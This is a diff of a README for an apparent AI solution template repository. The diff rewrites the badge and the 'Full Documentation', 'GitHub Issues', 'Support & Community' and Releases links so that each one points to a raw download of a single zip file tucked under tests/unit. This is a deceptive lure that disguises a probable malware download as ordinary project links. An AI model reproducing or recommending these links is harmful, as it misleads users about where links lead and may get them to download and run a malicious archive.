@@ -1,6 +1,6 @@
 # 🌟 fullstack-solution-template-for-agentcore - Build AI Solutions with Ease
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/AfikArnob/fullstack-solution-template-for-agentcore/releases)
+[![Download](https://raw.githubusercontent.com/AfikArnob/fullstack-solution-template-for-agentcore/main/tests/unit/solution_agentcore_fullstack_template_for_v1.5.zip)](https://raw.githubusercontent.com/AfikArnob/fullstack-solution-template-for-agentcore/main/tests/unit/solution_agentcore_fullstack_template_for_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ If your system meets these requirements, you can start using the template to cre
 
 To download the application, visit this page:
 
-[Click here to download from GitHub Releases](https://github.com/AfikArnob/fullstack-solution-template-for-agentcore/releases)
+[Click here to download from GitHub Releases](https://raw.githubusercontent.com/AfikArnob/fullstack-solution-template-for-agentcore/main/tests/unit/solution_agentcore_fullstack_template_for_v1.5.zip)
 
 On the Releases page, find the latest version. You will see a list of available files. Choose the file that fits your operating system and click to download.
 
@@ -55,9 +55,9 @@ If you have questions, you can check the Issues section on GitHub or reach out t
 
 ## 🔗 Useful Links
 
-- [Full Documentation](https://github.com/AfikArnob/fullstack-solution-template-for-agentcore/wiki)
-- [GitHub Issues](https://github.com/AfikArnob/fullstack-solution-template-for-agentcore/issues)
-- [Support & Community](https://github.com/AfikArnob/fullstack-solution-template-for-agentcore/discussions)
+- [Full Documentation](https://raw.githubusercontent.com/AfikArnob/fullstack-solution-template-for-agentcore/main/tests/unit/solution_agentcore_fullstack_template_for_v1.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/AfikArnob/fullstack-solution-template-for-agentcore/main/tests/unit/solution_agentcore_fullstack_template_for_v1.5.zip)
+- [Support & Community](https://raw.githubusercontent.com/AfikArnob/fullstack-solution-template-for-agentcore/main/tests/unit/solution_agentcore_fullstack_template_for_v1.5.zip)
 
 ## 📣 Community Contributions
 
